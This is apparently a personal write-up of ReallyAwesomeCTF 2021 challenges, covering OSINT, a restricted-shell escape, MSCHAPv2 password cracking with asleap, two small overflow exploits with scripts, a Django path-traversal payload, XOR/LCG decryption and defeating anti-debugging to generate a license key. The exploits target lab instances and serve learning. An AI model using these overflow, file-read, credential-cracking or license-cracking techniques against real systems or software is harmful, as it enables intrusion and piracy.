# ReallyAwesomeCTF 2021

ReallyAwesomeCTF 2021, from August 13 3PM - August 16 3PM (EDT).

## Overview

Writeups to challenges are linked here, arranged by points.

Challenge | Category | Points | Solves | Comments
--------- | -------- | ------ | ------ | --------
[Discord](#Discord-Miscellaneous-50-pts) | Miscellaneous | 50 | 433 | Sanity check
[Skyline](#OSINT) | OSINT | 100 | 243
[Triangles](#OSINT) | OSINT | 100 | 451
[RSFPWS - Intercepted](#RSFPWS---Intercepted-Miscellaneous-150-pts) | Miscellaneous | 150 | 99
[Silver Darlings](#OSINT) | OSINT | 150 | 325
[Call&Response](#CallResponse-Miscellaneous-200-pts) | Miscellaneous | 200 | 123
[John Poet](#OSINT) | OSINT | 200 | 285
[OHSHINT](#OSINT) | OSINT | 200 | 172
[50m on the Right](#OSINT) | OSINT | 250 | 300
[Missing Tools](#Missing-Tools-Miscellaneous-250-pts) | Miscellaneous | 250 | 165
[Absolute Dice](#Absolute-Dice-PwnReversing-300-pts) | Pwn/Reversing | 300 | 74
[Dodgy Databases](#Dodgy-Databases-PwnReversing-350-pts) | Pwn/Reversing | 350 | 117
[Emojibook](#Emojibook-Web-350-pts) | Web | 350 | 133
[Lego Car Generator](#Lego-Car-Generator-PwnReversing-350-pts) | Pwn/Reversing | 350 | 54
[Packed](#Packed-PwnReversing-350-pts) | Pwn/Reversing | 350 | 56

## Afterthoughts

This was my second time participating in a CTF. This one was really different from the previous one and the other ones that I've seen, because the usual categories are Web, Pwn, Reversing, Crypto, and Miscellaneous (which usually includes OSINT, forensics, or stego). This time, pwn/reversing (and crypto, although not specifically in the name) were all combined into one category, and Miscellaneous, OSINT, and Steganography got their own categories. My personal preference leans toward the usual categories with more pwn and reversing, but this was also fun and different. I couldn't get any steganography due to a significant lack of experience in it, but the pwn/reversing challenges were definitely very interesting. :D

## Writeups

## Discord (Miscellaneous, 50 pts)

### Description

Come join our [Discord](https://discord.gg/Rrhdvzn)!

### Solution

I swear I spent way too much time on it because I looked at all the channel descriptions *except for* #general channel. I still don't know how I missed it for so long. But here it is:

![image](https://user-images.githubusercontent.com/11196638/129629365-f4a05b69-ebde-4cbb-884b-a1e624815a18.png)

### Flag
```
ractf{so_here_we_are_again}
```

## OSINT

Challenge | Location Link | Explanation
--------- | ------------- | -----------
[Triangles](OSINT_images/triangles.jpg) | https://goo.gl/maps/qr7Qbriw2egc8SFBA | Ragusa Foto Festival; in the left down corner, there's a sign with Palazzo Cosentini, etc...
[Skyline](OSINT_images/skyline.jpg) | https://goo.gl/maps/ycHeJL72VyLpFAp97 | Go along London's river, look for two towers and a zipline, with a small river that goes off the side
[Silver Darlings](OSINT_images/silver_darlings.jpg) | https://goo.gl/maps/tgKfk3gWUrgwoEJaA | Cafe de la Mairie, Chambres dhotes
[John Poet](OSINT_images/john_poet.jpg) | https://goo.gl/maps/kofmRvGnRvNGPCQD8 | RHC, glass buildings, parasol; Rail House Cafe
[50m on the Right](OSINT_images/50m_on_the_right.jpg) | https://goo.gl/maps/iwo1hcwe5Sr592RJ8 | on the sign, Bistro 24; also you can *barely* read armacao de pera under the logo
[OHSHINT](OSINT_images/image.jpg) | https://goo.gl/maps/Q9AavYfW8HoxFZHA8 | hint in the metadata of image; look for a big lake northeast of Lancaster; pine lake

## RSFPWS - Intercepted (Miscellaneous, 150 pts)

### Description

Challenge instance ready at `193.57.159.27:35582`. Click here to request a new instance.  
This challenge also has something on port 35582/udp

This game i'm playing is fun! There's this box that seemingly does nothing though... It sends a "network request" whatever that is. Can you have a look?  
(When the game launches, enter the IP and port you get from above. This challenge uses the same files and instance as other RSFPWS challenges)

### Attachments

[`windows_clinet.zip`](windows_clinet.zip)  
[`linux_client.zip`](linux_client.zip)

### Solution

The file given is a unity game. Upon running it and logging in with the given IP address and port, we see:

![image](https://user-images.githubusercontent.com/11196638/129629507-54ca736b-51bb-4f02-a8ac-024f40229e8e.png)

There are 3 challenges in this game; this one seems to be related to the rightmost one:

![image](https://user-images.githubusercontent.com/11196638/129629604-c45c2625-8f29-4b56-9a67-b18ef65bc763.png)

The challenge also mentions that there's something at the udp port. We'll try wiresharking to capture the packet when I enter the box:

![rsfpws-intercepted](https://user-images.githubusercontent.com/11196638/129629734-e4544dac-0c70-48bb-9bd6-ca3bd15b4312.PNG)

Nice.

### Flag
```
ractf_N3tw0rking_L`ke_4_B0ss!}
```

## Call&Response (Miscellaneous, 200 pts)

### Description

Agent,

We're working a major case. We've been called in to covertly investigate a foreign govt agency, the GDGS, by a private organisation. We've finished performing initial reconnaissance of the target building and it's surrounding areas. We know they have a wireless network which they use to carry out live activities. Gaining access here would be substiantial. Problem is, they've somewhat competently secured it using WPA2 EAP-PEAP authentication which means gaining a packet capture of the handshake process is useless as the authentication exchange is carried out over a TLS 1.2 session. Nonetheless, we setup an access point with same ESSID as the target and managed to trick an employee's device into attempting to connect to our AP. In the process, we've obtained an username and certain auth values. We're not entirely sure what we need to do with them.

Can you take a look and help us recover the password?
```
username:    PrinceAli
c:    c3:ae:5e:f9:dc:0e:22:fb
r:    6c:52:1e:52:72:cc:7a:cb:0e:99:5e:4e:1c:3f:ab:d0:bc:39:54:8e:b0:21:e4:d0
```
Flag format is `ractf{recovered_password}`.

### Solution

I don't know much about WPA2 EAP-PEAP or TLS, but some google search related to WPA2 EAP-PEAP authentication and call and response gives [this](https://solstice.sh/ii-attacking-and-gaining-entry-to-wpa2-eap-wireless-networks/). Based on it, we'll try `asleap`:

![image](https://user-images.githubusercontent.com/11196638/129631307-7acc4ad3-046e-4a3a-8eba-31b440c02259.png)

Noice.

### Flag
```
ractf{rainbow6}
```

## Missing Tools (Miscellaneous, 250 pts)

### Description

Challenge instance ready at `193.57.159.27:42380`. Click here to request a new instance.

Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?

Username: `ractf`  
Password: `8POlNixzDSThy`  
Note: it may take a minute or more for your container to start depending on load

### Solution

After ssh'ing in, we see a restricted shell. This shell doesn't even allow `ls`. I tested for things that would work:

```
baba@baba:~$ ssh -p 42380 ractf@193.57.159.27
ractf@193.57.159.27's password:
Linux restricted shell
$ cat
This command has been disabled by your administrator.
$ ls
This command has been disabled by your administrator.
$ vi
This command has been disabled by your administrator.
$ pwd
/home/ractf
$ echo

$ cd
$ .
.: Needs 1 argument
```

Huh? What does a `.` do? Apparently it's a [`source`](https://ss64.com/bash/source.html) command that executes commands from the input file. Interesting.

We still don't know what we have in the current directory. Fortunately, we have a poor-man's `ls`: [`echo *`](https://superuser.com/questions/901183/who-deals-with-the-star-in-echo)

```
$ echo *
flag.txt
$ . flag.txt
.: ractf{std0ut_1s_0v3rr4ted_spl1t_sha}: No such file or directory
```

Thanks, bash, for the detailed error message.

### Flag
```
ractf{std0ut_1s_0v3rr4ted_spl1t_sha}
```

## Absolute Dice (Pwn/Reversing, 300 pts)

### Description

Challenge instance ready at `193.57.159.27:35383`. Click here to request a new instance.

Man, the final boss of this game is kickin' my ass! Can you give me a hand?

### Attachment

[`AbsoluteDice`](AbsoluteDice)

### Solution

After [painstakingly trying to figure out](ADsol.png) what this does, I think this is what the program is doing (please bear with me writing pseudocode in python + c):

```
int inp_array[33];
int i = 0
while(i < 100):
    i += 1
    fread(&seed, 4, 1, fopen("/dev/urandom", "r"))
    srand(seed)
    inp = input("Enter your guess> ")
    ad_roll = rand() % 21
    inp_array[i % 33] = inp
    /* code checking if input is correct 31 consecutive times */
```

I also noticed that the program always segfaults on the 32nd or 33rd input. That's strange. Looking at it from `gdb`, it crashes when it tries to call `fread` on file descriptor `0`, which means `fopen` returned `NULL`. And `fopen` seems to have tried to read from address that I had input previously.

Looking into it a little more:

- `ebp-0x10` stores the address of string `/dev/urandom`.
- The `inp_array` stores its value from `ebp-0x90` to `ebp-0x10`.
- The first value will be stored at `inp_array[1]`, not at index `0`.

So the 32nd input will write at `ebp-0x10`, where it used to have the address of `'/dev/urandom'`, replacing it with out input. 4-bytes from `/dev/urandom` are used as the seed to `srand` every loop, so if we can overwrite it with an existing file that is not random, we can seed random with the same value everytime. For this, I chose `'flag.txt'` within the file, which is at `0x8048bb9`. Luckily, the binary has no PIE.

At this point, it's trivial; on the 32nd input, we give `134515641` (the decimal value for `0x8048bb9`), and figure out what "random" value it produces (it produced 11); then, rerun the program, give the same 32nd input, and repeat that "random" value 31 times. As a side note, unlike the output which seems to require 50 consecutive correct inputs, the actual code only checks 31 times.

```py
import pwn

io = pwn.remote('193.57.159.27', 35383)
FLAG_ADDR = b'134515641'
for _ in range(31):
    io.sendline(b'1')
io.sendline(FLAG_ADDR)
io.recvline()
for _ in range(31):
    io.sendline(b'11')
io.interactive()
```
```
$ python3 dice.py
[+] Opening connection to 193.57.159.27 on port 35383: Done
[*] Switching to interactive mode

Enter your guess> Absolute Dice scores a hit on you! (She had 7, you said 1)
Enter your guess> Absolute Dice scores a hit on you! (She had 17, you said 1)
...
Enter your guess> Absolute Dice scores a hit on you! (She had 9, you said 1)
Enter your guess> Absolute Dice scores a hit on you! (She had 15, you said 134515641)
Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (1/50)
Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (2/50)
...
Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (31/50)
Absolute Dice shrieks as you take her down with a final hit.ractf{Abs0lute_C0pe--Ju5t_T00_g00d_4t_th1S_g4me!}
```

Flage.

### Flag
```
ractf{Abs0lute_C0pe--Ju5t_T00_g00d_4t_th1S_g4me!}
```

## Dodgy Databases (Pwn/Reversing, 350 pts)

### Description

Challenge instance ready at `193.57.159.27:44340`. Click here to request a new instance.
One of our most senior engineers wrote this database code, it's super well commented code, but it does seem like they have a bit of a god complex. See if you can help them out.

### Attachment

[`challenge.zip`](challenge.zip)

### Solution

We're conveniently given the source code. Reading through it, there's a `GOD` role with the value of `0xBEEFCAFE`; when `users_register_user` is called, if  the `admin` is `ROLE_GOD`, then it will print out the flag. While the only input we give is the user to register, we can also see that the input username is 30 characters long, whereas the `User` struct has `name[USERNAME_LEN]; Role role;`. `USERNAME_LEN` is 20, so we can just overwrite the `role` with the value of `ROLE_GOD`.

```
$ echo -e 'AAAAAAAAAAAAAAAAAAAA\xfe\xca\xef\xbe' | nc 193.57.159.27 44340
Hi, welcome to my users database.
Please enter a user to register: ractf{w0w_1_w0nD3r_wH4t_free(admin)_d0e5}
```

Neato.

### Flag
```
ractf{w0w_1_w0nD3r_wH4t_free(admin)_d0e5}
```

## Emojibook (Web, 350 pts)

### Description

Challenge instance ready at `193.57.159.27:25730`. Click here to request a new instance.

![image](https://user-images.githubusercontent.com/11196638/129639564-c4a92a59-abcf-4aaa-8860-816fa06e329c.png)

The flag is at `/flag.txt`

### Attachment

[`src.zip`](src.zip)

### Solution

![image](https://user-images.githubusercontent.com/11196638/129639652-a7c87042-61f7-41a4-9be1-6b137aeb31a7.png)

Attempting to create a new note gives error 500, so we register and login. The `New Note` tab let's us create a note with a title and a body. Let's look at the source file given.

Reading through `notes/views.py`, this section looks interesting:

```py
def view_note(request: HttpRequest, pk: int) -> HttpResponse:
    note = get_object_or_404(Note, pk=pk)
    text = note.body
    for include in re.findall("({{.*?}})", text):
        print(include)
        file_name = os.path.join("emoji", re.sub("[{}]", "", include))
        with open(file_name, "rb") as file:
            text = text.replace(include, f"<img src=\"data:image/png;base64,{base64.b64encode(file.read()).decode('latin1')}\" width=\"25\" height=\"25\" />")

    return render(request, "note.html", {"note": note, "text": text})
```

This searches for the body of the note with regex `({{.*??}})`, which is something in the form `"{{" + (anything) + "}}"`; then it does a `os.path.join("emoji", re.sub("[{}]", "", include)`, attempting to get the emoji path after removing braces from the previously searched string. A [quick read on `os.path.join`](https://docs.python.org/3/library/os.path.html#os.path.join) tells us that if there's an absolute address in the middle, it will discard everything previously and use that absolute address as base. With the file name achieved from the os.path.join call, it opens that file and base64 encodes it, and wraps it in the `<img>` tag. Now it's simple, just do {{/flag.txt}} and look at source to get the base64 of the flag, right?

No. Well, sort of. In `notes/forms.py`, we actually see that the braces in the input are removed when it saves the note:
```
def save(self, commit=True):
    instance = super(NoteCreateForm, self).save(commit=False)
    instance.author = self.user
    instance.body = instance.body.replace("{{", "").replace("}}", "").replace("..", "")

    with open("emoji.json") as emoji_file:
        emojis = json.load(emoji_file)

        for emoji in re.findall("(:[a-z_]*?:)", instance.body):
            instance.body = instance.body.replace(emoji, "{{" + emojis[emoji.replace(":", "")] + ".png}}")
```

But it does it in a bad way. Using the fact that it also removes "..", we just do this: `{..{/flag.txt}..}`

Decoding with base64 gives the flag.

*This was apparently an unintended solution due to a mistake in setting the docker file. The challenge as intended would not give us access to the flag, and is the Emojibook 2 challenge.*

### Flag
```
ractf{dj4ng0_lfi}
```

## Lego Car Generator (Pwn/Reversing, 350 pts)

### Description

I encrypted the flag with this program into `secret`. But then I accidentally lost the original file! Can you help me recover the flag please?

### Attachments

[`secret`](secret)  
[`encrypter`](encrypter)

### Solution

The encrypter takes an input file and an output file, and works as such: it gets a 4-byte random number, and xors it with 4 bytes from the input. A new "random" number is then generated from `rngNext32`, and repeats the process until the end. `rngNext32` totally produces a random number, I swear!

```
void rngNext32(int *param_1)
{
    *param_1 = *param_1 * 0x17433a5b + -0x481e7b5d;
    return;
}
```
(from ghidra)

Yes, very random.

Well, we already know the first 6 bytes of the flag, `ractf{`. Since this encryption is just xor's, we can figure out the seed used by xoring `ract` with the 4 bytes of the encrypted flag. After figuring out the seed, we can just reverse it by xoring the totally-random-number we know from the seed, with the encrypted flag.

```py
with open('secret', 'rb') as f:
    get_seed = True
    data = f.read(4)
    flag = b'ract'
    seedb = b''
    while data:
        if get_seed:    # figure out seed
            for i in range(4):
                seedb += (flag[i]^data[i]).to_bytes(1,'big')
            seed = int.from_bytes(seedb, 'big')
            get_seed = False
        else:           # get flag
            seedb = seed.to_bytes(4, 'big')
            for i in range(len(data)):
                flag += (seedb[i]^data[i]).to_bytes(1,'big')
        seed = (seed*0x17433a5b-0x481e7b5d)&0xFFFFFFFF
        data = f.read(4)
print(flag)
```
```
$ python3 lcg.py
b'ractf{CL04K_3NGa6ed}sikeyouthoughttheflagwasthislong\n\xea'
```

Welp, apparently the flag wasn't that long.

### Flag
```
ractf{CL04K_3NGa6ed}
```

### Comments

So I was wondering why it was named Lego Car Generator. The acronym LCG stands for [Linear Congruential Generator](https://en.wikipedia.org/wiki/Linear_congruential_generator), which is how this challenge generates the next random number.

## Packed (Pwn/Reversing, 350 pts)

### Description

One of our team wants to use this Really Awesome Console Application, but they don't want to pay for it. Can you help them crack it and generate a license key for the username `John Smith`?

### Attachment

[`really awesome console application`](really awesome console application)

### Solution

This is an `.exe` file. Unfortunately, it's also my first time looking into anything that's not an `ELF` file. Putting into a disassembler, the first challenge is to find `main` function. I don't want to look at all of the functions, so let's try running the program instead.

```
Enter your name > John Smith
Enter License Key > asdf
Incorrect License key!
Press any key to continue...
```

Ok. While the binary doesn't have the strings `"Enter your name > "` or  `"Enter License Key > "`, it does have `"Press any key to continue"` and `"Debugger detected!"` (there's also a [youtube link](https://www.youtube.com/watch?v=ub82Xb1C8os)). Going to the function that has those strings, it does indeed look like the main function we should look at.  
The first thing we notice about this function is that there's a debugger check with `IsDebuggerPresent`. The second thing we notice is that there's a section doing some operation on a `0x3000` byte data section.

<p align="center">
<img src="https://user-images.githubusercontent.com/11196638/129649286-0b77b8b7-223a-473e-9b3f-7761f7669b9b.png"/>
</p>

Looks like a relatively simple operation - `xmm1` is `data_404340`, which is `b'\x05' * 16`, and `xmm2` is `data_404350`, which is `b'\x80' * 16`. So every byte of the data section starting at `0x406018` is subtracted by `0x05` and xor'd with `0x80`. Let's do that, and write it out to a file.
```py
from binascii import unhexlify, hexlify
res = b''
with open('raca_data406018', 'r') as f:
    for line in f:
        linea = line.strip().split()
        linea = linea[1:9]
        dataline = unhexlify(''.join(linea))
        res += bytes(((b-0x05)&0xff)^0x80 for b in dataline)
with open('raca_data_interpreted', 'wb') as ff:
    ff.write(res)
```
The `xxd` output of the created file:
```
00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 f800 0000  ................
00000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ........!..L.!Th
00000050: 6973 2070 726f 6772 616d 2063 616e 6e6f  is program canno
00000060: 7420 6265 2072 756e 2069 6e20 444f 5320  t be run in DOS
00000070: 6d6f 6465 2e0d 0d0a 2400 0000 0000 0000  mode....$.......
00000080: b94b 31fc fd2a 5faf fd2a 5faf fd2a 5faf  .K1..*_..*_..*_.
```
`MZ` is the magic number for the [`DOS MZ executable`](https://en.wikipedia.org/wiki/DOS_MZ_executable). So it's another `.exe` file. For some reason, the file created like this couldn't be run (and was flagged as a Trojan virus), but the code after that creates an temporary executable with name created by `tmpnam_s`, executes that temporary file, and removes it. So after executing it and leaving it to wait for the input, at `C:\Users\<username>\AppData\Local\Temp`, there was an executable that was created. Let's disassemble this one.

In this file, we do see the strings `"Enter your name > "` or  `"Enter License Key > "`. It didn't look that hard to read through it, but I realized that the assembly code was too messy to actually figure out how it was generating the license key (with unpopped pushes and addresses relative to `esp` which was constantly being changed). The basic gist of the program was that it does the debugger check, saves that result somewhere, and gets the name and license key inputs; then, using the name and the result from the debugger, it does some operation to generate a license key. This generated key is compared to the license key that was input. From the format string, we know that the format of the license key will be `"RA-%d-%s"`.

Since I couldn't really wrap my head around how this generator works, I decided to use a debugger ([x64dbg](https://x64dbg.com/#start)) and try to bypass the debugger check. The debugger check happens in the beginning, and during every loop of the generation of the license key (from the name and the result of the first debugger check).
<p align="center">
  <img src="https://user-images.githubusercontent.com/11196638/129652720-22f419b3-fdd8-4e76-901d-b94bae55f405.png"/>
</p>
<p align="center">The debugger check</p>

Because there were some other checks before the last one, and I didn't want to go through clicking and changing registers more than I needed to, I decided to set a breakpoint at `0x401099` and set `dl` to 0. This should pass the test. Then we can check the format-string result after the `vsprintf` call to see the license key that was generated. Now set the breakpoint and off we go!

<p align="center">
  <img src="https://user-images.githubusercontent.com/11196638/129653120-e466fb50-abfa-405c-b27c-9a59d8b9c621.png"/>
</p>
<p align="center">Breakpoint at the last check in the debugger-check function</p>

<p align="center">
  <img src="https://user-images.githubusercontent.com/11196638/129653480-8882a30a-150d-4d0a-903a-dfc05423f154.png"/>
</p>
<p align="center">The license key?</p>

Now that we have the license key, let's check it through the program and submit it as the flag:

![image](https://user-images.githubusercontent.com/11196638/129654816-78912e58-8f63-452e-8dce-9fd8da0bf096.png)

Huh?

(During the ctf, I actually submitted without checking, which is how I have 1 incorrect submission)

Obviously something's wrong. Let's try going through the instructions step by step, in the debugger-check function.

1. `IsDebuggerPresent` returns 0 to `eax` if there's no debugger.
2. `test eax, eax; setne dl` will make `dl` 0, then store it into `ebp-0x19`.
3. `al` is set to 0, 0 is moved to `ebp-0x4`, then `EFLAGS` is pushed, the trap flag (`0x100` of `EFLAGS`) is set on it, then popped; `ebp-0x4` is set to -2.
4. `dl` is checked if it's 0. In the no-debugger case, it is, so it doesn't take the jump.
5. Not taking the jump, `al` is 0 so `test al, al; sete dl` sets `dl` to 1.
6. `dl` value is moved to `al`, xor'd with 1, then saved to `[esi]`.
7. `dl` is not 0 at this point, so `test dl, dl; je 0x4010c6` does not jump, which prints `"Unauthorized software detected!"` and exits.

What? The more I read through it, the more it didn't make sense. I checked with the debugger to see if my logic was right, by setting the breakpoint right after `IsDebuggerPresent` and setting `eax` to 0, then stepping through it. The logic was indeed correct, and no matter what the `IsDebuggerPresent` returned, it always resulted in `"Unauthorized software detected!"`. At this point, I said screw it and tried running it (instead of stepping through) after setting `eax` to 0...

![image](https://user-images.githubusercontent.com/11196638/129656150-fd846a32-9e41-4149-bca7-b2036dcab9b4.png)

and it worked! According to the sequential flow, it is impossible to have `edx` to be 0 at that point, but it somehow was. Stepping through it, however, still made `edx` 1. The reason the previous key was incorrect was that I should have set `eax` to 0 right after `IsDebuggerPresent`, because it stores that result and uses it later to compute the license key. Well, we now got it working, so we can get the flag.

<p align="center">
  <img src="https://user-images.githubusercontent.com/11196638/129656797-fd197327-7f9a-463d-a4b8-9bac4b7192dc.png"/>
</p>
<p align="center">The license key.</p>

We can check its validity by putting it through our Really Awesome Console Application:

![image](https://user-images.githubusercontent.com/11196638/129656934-5ce9b365-7d43-4874-9e47-e09cc2995f51.png)

### Flag
```
ractf{RA-1100-JHRMT}
```

### Addendum

After the ctf was over, the source code was posted on discord:

```c++
#include <iostream>
#include <Windows.h>
#include <random>

bool performDebuggerChecks(bool* i) {
    bool debuggerAttached = false;

    debuggerAttached = IsDebuggerPresent();

    bool exceptionFlag = false;
    __try {
        _asm {
            pushfd
            or dword ptr [esp], 0x100
            popfd
            nop
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        exceptionFlag = true;
    }

    if (!debuggerAttached) { debuggerAttached = !exceptionFlag; }

    *i = !debuggerAttached;

    if (debuggerAttached) {
        std::cout << "Unauthorized software detected!" << std::endl;
        exit(1);
    }

    return debuggerAttached;
}

int main()
{
    bool i;
    bool fake = performDebuggerChecks(&i);

    std::cout << "Enter your name > ";
    char name[64];
    std::cin.get(name, 64);

    std::cin.ignore();

    std::cout << "Enter License key > ";
    char key[64];
    std::cin.get(key, 64);

    int acc = 0;
    char acc2[50];
    memset(acc2, 0x00, 50);
    int k = 0;

    for (int i = 0; i < strlen(name); i++) {
        if (i % 2 == performDebuggerChecks(&fake)) {
            acc += 61;
            acc2[k] = toupper((char)((((int)tolower(name[i] - 97)) % 25) + (96+fake)));
            k++;
        }
        acc ^= (int)name[i];

        acc += (int)name[strlen(name) - (i + fake + 1)];
    }

    char expected[50];
    sprintf_s(expected, "RA-%d-%s", acc, acc2);
    
    for (int i = 0; i < strlen(expected); i++) {
        if (expected[i] != key[i]) {
            std::cout << "Incorrect license key!\n";
            return 1;
        }
    }

    std::cout << "Software unlocked! Thanks for your support.\n";
}

// fake is 1 if debugger NOT present
```
Our center of attention is here:
```c++
    debuggerAttached = IsDebuggerPresent();

    bool exceptionFlag = false;
    __try {
        _asm {
            pushfd
            or dword ptr [esp], 0x100
            popfd
            nop
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        exceptionFlag = true;
    }

    if (!debuggerAttached) { debuggerAttached = !exceptionFlag; }
```
Ok, it's a try-except thing. `dl` seems to be the `debuggerAttached` and `al` would be the `exceptionFlag`. Doing some more searching, I found [this](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x86-architecture#x86-flags), [this](https://www.a1logic.com/2012/10/23/single-step-debugging-explained/), [this](https://anti-debug.checkpoint.com/techniques/assembly.html#popf_and_trap_flag), and [this](https://www.matteomalvica.com/blog/2020/04/10/x64-trap-flag-antidebugger/). This is another anti-debugging method; basically, when a trap flag is set, a single step exception is raised, which should be handled by a handler and unset before executing the next instruction. When a debugger single-steps through instructions or is set to handle the single step exception, the debugger will handle it and set the trap flag to 0; when running normally without the debugger handling it, the exception will be handled by the program if it exists, or crash. In our case, we need it to go through the exception handler within the program rather than the debugger, and that's why it only works when it runs without single-stepping. The `nop` is there because the exception is raised after the execution of one instruction (per the microsoft documentation in the first link).

TIL. Very cool stuff.
